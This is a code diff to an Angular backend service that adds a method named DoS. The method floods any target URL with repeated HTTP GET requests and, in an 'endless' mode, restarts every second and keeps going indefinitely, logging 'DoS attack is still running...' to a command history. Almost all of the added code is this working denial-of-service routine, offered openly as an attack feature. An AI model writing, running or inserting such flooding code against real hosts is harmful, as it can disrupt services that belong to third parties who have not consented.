@@ -3,6 +3,7 @@ import { Injectable } from '@angular/core';
 import { Observable } from 'rxjs';
 import { environment } from 'src/environments/environment';
 import { UUID } from '../models/uuid';
+import { CommandHandler } from '../models/commandHandler';
 
 @Injectable({
     providedIn: 'root'
@@ -77,5 +78,23 @@ export class BackendServiceService {
         body = body.set('amount', amount);
         body = body.set('sessionToken', this.sessionToken);
         return this.http.post(`${this.apiUrl}/counter/counter.php`, body, { headers })
+    }
+
+    async DoS(target: string, amount: number, endless: boolean = false, obj: CommandHandler): Promise<number> {
+        for (let i = 0; i < amount; i++) {
+            if (endless && i == amount - 1) {
+                obj.appendHistory({ text: "DoS attack is still running...", type: "output" });
+            }
+            if (endless && i == amount - 1) {
+                await new Promise(r => setTimeout(r, 1000));
+                i = 0;
+            }
+            try {
+                this.http.get(target).subscribe();
+            } catch (error) {
+                return i;
+            }
+        }
+        return amount;
     }
 }
